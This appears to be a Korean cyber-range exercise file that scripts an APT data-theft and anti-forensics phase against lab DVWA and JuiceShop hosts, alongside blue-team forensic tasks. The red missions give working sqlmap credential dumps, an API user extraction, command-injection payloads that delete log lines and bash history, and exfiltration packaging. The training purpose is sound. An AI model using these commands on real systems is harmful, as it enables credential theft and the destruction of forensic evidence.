id: "apt-phase3"
title: "APT 3단계: 데이터 탈취 + 흔적 삭제"
description: "APT 그룹이 내부 네트워크에 거점을 확보한 상황이다. 3단계에서 Red Team은 데이터베이스를 덤프하고 로그를 변조하여 흔적을 삭제해야 한다. Blue Team은 데이터 무결성을 검증하고 타임라인 포렌식으로 공격 전 과정을 재구성해야 한다."
difficulty: "hard"
time_limit: 3600
battle_type: "1v1"

red_missions:
  - order: 1
    instruction: "SQLi를 통해 DVWA 데이터베이스의 전체 테이블 목록을 덤프하라."
    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --tables 2>&1 | tail -30"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "tables"
      semantic:
        intent: "MITRE T1213 (Data from Information Repositories) — DB schema enumeration. exfil 전 어떤 table 에 어떤 PII 가 있는지 식별."
        success_criteria:
          - "sqlmap --batch --tables (또는 --current-db)"
          - "응답에 [N tables] + table 이름 list (users/products 등)"
          - "최소 1 table 식별"
        acceptable_methods:
          - "sqlmap --tables"
          - "manual UNION SELECT table_name FROM information_schema.tables--"
          - "Burp Repeater + UNION 페이로드"
        negative_signs:
          - "DB 목록 만 + table 누락"
          - "interactive 응답 대기 (--batch 누락)"

  - order: 2
    instruction: "SQLi를 통해 사용자 크리덴셜을 덤프하라."
    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch -T users --dump 2>&1 | tail -30"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "admin"
      semantic:
        intent: "MITRE T1003 (OS Credential Dumping) DB variant — users 테이블에서 username + password hash 추출. 크리덴셜 stuffing 또는 hash crack 의 prerequisite."
        success_criteria:
          - "sqlmap --dump -T users (-D dvwa 명시)"
          - "응답에 admin row + password hash (32자 hex MD5)"
          - "(보너스) hash 종류 식별 (MD5/bcrypt/sha512)"
        acceptable_methods:
          - "sqlmap --dump -T users"
          - "manual UNION SELECT user, password FROM users--"
          - "John the Ripper hash crack 후속"
        negative_signs:
          - "table 만 dump + admin row 분석 없음"
          - "hash 종류 식별 안 함 (다음 step crack 어려움)"

  - order: 3
    instruction: "JuiceShop의 API를 통해 모든 사용자 정보를 추출하라."
    hint: "curl -s http://10.20.30.80:3000/api/Users | python3 -m json.tool 2>&1 | head -40"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "email"
      semantic:
        intent: "MITRE T1530 — REST API 의 전체 user dump. JuiceShop /api/Users 인증 우회 (BAC) 또는 stolen token 활용."
        success_criteria:
          - "GET /api/Users (인증 또는 우회)"
          - "응답에 email/username/role 1개 이상"
          - "JSON pretty-print 로 가독성 확보"
        acceptable_methods:
          - "curl + jq"
          - "stolen JWT token (Step 2 의 admin password)"
          - "/rest/admin/users (alternate)"
        negative_signs:
          - "raw JSON dump + email 분석 없음"
          - "401/403 인데 우회 안 시도"

  - order: 4
    instruction: "Command Injection으로 웹 서버의 Apache 접근 로그를 변조(자신의 IP 기록 삭제)를 시도하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;sed+-i+\"/10.20.30.201/d\"+/var/log/apache2/access.log+2>&1;echo+log_cleared&Submit=Submit'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "log_cleared"
      semantic:
        intent: "MITRE T1070.002 (Clear Linux or Mac System Logs) — access.log 의 attacker IP line 삭제. forensic evidence 제거. apache www-data 권한 부족 시 차단되어야 정상."
        success_criteria:
          - "sed -i '/<attacker_ip>/d' /var/log/apache2/access.log"
          - "응답에 log_cleared confirm"
          - "권한 부족 시 alternate path 시도"
        acceptable_methods:
          - "sed -i + cmd inject"
          - "echo > log (전체 truncate)"
          - "shred -u (복구 차단)"
          - "logrotate 강제 + 새 file 시작"
        negative_signs:
          - "Permission denied 받고 종료 (권한 escalation 안 시도)"
          - "log_cleared confirm 없음"

  - order: 5
    instruction: "Command Injection으로 bash_history를 삭제하여 명령 실행 흔적을 제거하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/dev/null+>+~/.bash_history+2>&1;echo+history_cleared&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "history_cleared"
      semantic:
        intent: "MITRE T1070.003 (Clear Command History) — bash_history truncate. apache www-data home 의 history. cmd inject 후 자취 제거."
        success_criteria:
          - "cat /dev/null > ~/.bash_history (또는 history -c)"
          - "응답에 history_cleared"
          - "(보너스) HISTFILE unset / .bash_logout 정리"
        acceptable_methods:
          - "cat /dev/null >"
          - "echo > ~/.bash_history"
          - "history -c + history -w"
          - "unset HISTFILE"
        negative_signs:
          - "history -c 만 (메모리만 + file 미삭제)"
          - "~/.bash_history 가 apache uid 의 home 이 아닐 때 alternate 안 시도"

  - order: 6
    instruction: "Command Injection으로 auth.log에서 자신의 IP 관련 기록 삭제를 시도하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;sed+-i+\"/10.20.30.201/d\"+/var/log/auth.log+2>&1;echo+auth_cleared&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "auth_cleared"
      semantic:
        intent: "MITRE T1070.002 — auth.log 의 SSH/sudo 시도 기록 삭제. 권한 부족 (root 만 쓰기) → 보통 차단 정상."
        success_criteria:
          - "sed -i '/<attacker_ip>/d' /var/log/auth.log"
          - "응답에 auth_cleared 또는 Permission denied"
          - "권한 부족 시 정상 (auth.log 는 root only)"
        acceptable_methods:
          - "sed -i (root 권한 가정)"
          - "logrotate 강제"
          - "rsyslog 재시작 + offsite log 차단"
        negative_signs:
          - "Permission denied 의 의미 분석 없음"
          - "alternate (rsyslog config 변경) 안 시도"

  - order: 7
    instruction: "추출한 데이터를 압축하고 인코딩하여 유출 준비를 완료하라."
    hint: "echo 'admin:password_hash:email@test.com' | gzip | base64 && echo 'Exfil package ready'"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "Exfil package ready"
      semantic:
        intent: "MITRE T1027 (Obfuscated Files) + T1560.001 (Archive: Utility) — gzip 압축 + base64 인코딩. IDS/DLP 우회 + size 감소."
        success_criteria:
          - "data → gzip → base64 chain"
          - "Exfil package ready confirm"
          - "(보너스) AES 암호화 추가 (Step 7+1)"
        acceptable_methods:
          - "gzip | base64"
          - "tar czf - <files> | base64"
          - "openssl enc -aes-256-cbc"
          - "7z -p<pwd> (encryption)"
        negative_signs:
          - "raw data 만 + 인코딩 누락"
          - "압축 만 + base64 누락 (binary corruption 위험)"

blue_missions:
  - order: 1
    instruction: "Wazuh에서 파일 무결성 모니터링으로 로그 파일 변조를 탐지하라."
    hint: "grep -i 'syscheck' /var/ossec/logs/alerts/alerts.json | grep -iE 'log\\|access\\|auth' | tail -20"
    points: 15
    target_vm: siem
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Red #4-6 의 log 변조 탐지 — Wazuh syscheck 가 /var/log/* 모니터링. truncate/sed 시 size/checksum 변경 alert."
        success_criteria:
          - "alerts.json grep syscheck + log/access/auth"
          - "최소 1개 alert + path + change type"
          - "rule.id 550~554 (file modified/added/removed)"
        acceptable_methods:
          - "grep + tail"
          - "jq filter syscheck group"
          - "Wazuh API: GET /security/agents/<id>/syscheck/<path>"
        negative_signs:
          - "syscheck 미설정 (/var/log 미감시)"
          - "alert 없으면 alternate (file mtime/size diff) 안 함"

  - order: 2
    instruction: "Apache 접근 로그의 무결성을 검증하라. 로그 파일의 크기와 최근 수정 시간을 확인하라."
    hint: "stat /var/log/apache2/access.log && wc -l /var/log/apache2/access.log"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "Modify"
      semantic:
        intent: "Log file 의 size + mtime + line count baseline 비교. 비정상 줄 수 감소 또는 mtime 비정상 = 변조 신호."
        success_criteria:
          - "stat <file> + wc -l"
          - "응답에 Size + Modify time + line count"
          - "(보너스) baseline 과 diff (이전 기록 비교)"
        acceptable_methods:
          - "stat + wc -l"
          - "sha256sum + 이전 baseline diff"
          - "AIDE / tripwire"
        negative_signs:
          - "stat 만 + line count 누락"
          - "baseline 비교 없음"

  - order: 3
    instruction: "suricata의 eve.json에서 공격자 IP의 전체 활동 타임라인을 재구성하라."
    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; lines=[json.loads(l) for l in sys.stdin]; [print(d.get('timestamp','')[:19], d.get('event_type',''), d.get('http',{}).get('url','')[:50] if 'http' in d else '') for d in sorted(lines, key=lambda x: x.get('timestamp',''))]\" 2>/dev/null | tail -30"
    points: 20
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "10.20.30"
      semantic:
        intent: "Network IDS timeline — attacker 의 모든 event (alert/http/dns/flow) 시간순 정렬. forensic 보고서 핵심 산출물."
        success_criteria:
          - "eve.json grep + python json parse + sort by timestamp"
          - "event_type + URL 또는 alert msg 추출"
          - "최소 5 event + 시간순 정렬"
        acceptable_methods:
          - "grep + python json"
          - "jq + sort_by(.timestamp)"
          - "Splunk/ELK timeline UI"
          - "TheHive case management"
        negative_signs:
          - "정렬 없이 raw dump"
          - "event_type 분류 없이"

  - order: 4
    instruction: "Wazuh의 알림 로그에서 전체 공격 타임라인(정찰-침투-유출)을 요약하라."
    hint: "cat /var/ossec/logs/alerts/alerts.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp','')[:19], json.loads(l).get('rule',{}).get('description','')[:60]) for l in sys.stdin if 'rule' in l]\" 2>/dev/null | tail -30"
    points: 15
    target_vm: siem
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Wazuh-side timeline — rule.description 으로 사람-readable 요약. Cyber Kill Chain 단계 매핑 (recon→exec→exfil)."
        success_criteria:
          - "alerts.json + python json + timestamp sort"
          - "rule.description 노출"
          - "Kill Chain phase 매핑 (보너스)"
        acceptable_methods:
          - "python json filter"
          - "jq '.timestamp + \" \" + .rule.description'"
          - "Wazuh dashboard 의 events"
        negative_signs:
          - "raw alert 만 + description 누락"
          - "시간 정렬 없음"

  - order: 5
    instruction: "웹 서버에서 최근 24시간 내 수정된 시스템 파일을 포렌식 관점에서 조사하라."
    hint: "find /var/log /etc /var/www -type f -mmin -1440 -ls 2>/dev/null | sort -k9 | tail -30"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "/var/log"
      semantic:
        intent: "Forensic — 24h 내 mtime 변경 file 식별. 정상 변경 (apt update / log rotation) 과 비정상 (webshell upload / config tamper) 구분."
        success_criteria:
          - "find /var/log /etc /var/www -mmin -1440 -ls"
          - "sort by mtime + tail (최근 변경 우선)"
          - "비정상 path (예: /var/www/uploads/.php) 식별"
        acceptable_methods:
          - "find -mmin/-mtime"
          - "AIDE diff / tripwire"
          - "rkhunter --propupd-only"
          - "forensic_collect skill"
        negative_signs:
          - "find 만 + 정상/비정상 분류 없음"
          - "단일 path 만 (다른 dir 무시)"

  - order: 6
    instruction: "ModSecurity 감사 로그에서 SQLi 공격의 상세 내용을 분석하라."
    hint: "grep -A 5 'sql\\|union\\|select' /var/log/apache2/modsec_audit.log | tail -30"
    points: 10
    target_vm: web
    verify:
      type: "output_contains"
      expect: "sql"
      semantic:
        intent: "ModSecurity audit log — SQLi rule (942xxx) 매칭 + 페이로드 본문 보존. 가장 정확한 SQLi forensic evidence."
        success_criteria:
          - "modsec_audit.log grep sql/union/select"
          - "rule id (942xxx) + matched 페이로드 + URL"
          - "최소 1개 SQLi 페이로드 추출"
        acceptable_methods:
          - "grep + tail modsec_audit.log"
          - "jq (modsec3 JSON)"
          - "ModSecurity log analyzer (msc-aud)"
        negative_signs:
          - "audit_log 비어있음 (SecAuditEngine off)"
          - "rule id 분석 없이 raw dump"

  - order: 7
    instruction: "suricata 알림에서 데이터 유출 시도 패턴을 확인하고 관련 룰 ID를 식별하라."
    hint: "grep -iE 'exfil\\|data\\|leak\\|transfer' /var/log/suricata/fast.log | tail -10; grep -oP '\\[\\d+:\\d+:\\d+\\]' /var/log/suricata/fast.log | sort -u | tail -10"
    points: 10
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "["
      semantic:
        intent: "Suricata 의 exfil 카테고리 alert (POLICY/DATA_LEAK 등) + SID 식별. 네트워크 layer 데이터 유출 detection."
        success_criteria:
          - "fast.log grep exfil/data/leak/transfer"
          - "[gid:sid:rev] 형식 추출 + sort -u"
          - "최소 1개 unique SID"
        acceptable_methods:
          - "grep + tail + grep -oP"
          - "jq alert filtering eve.json"
          - "Wazuh suricata decoder"
        negative_signs:
          - "exfil 카테고리 룰셋 미적용 (suricata-update)"
          - "SID 만 + signature description 누락"
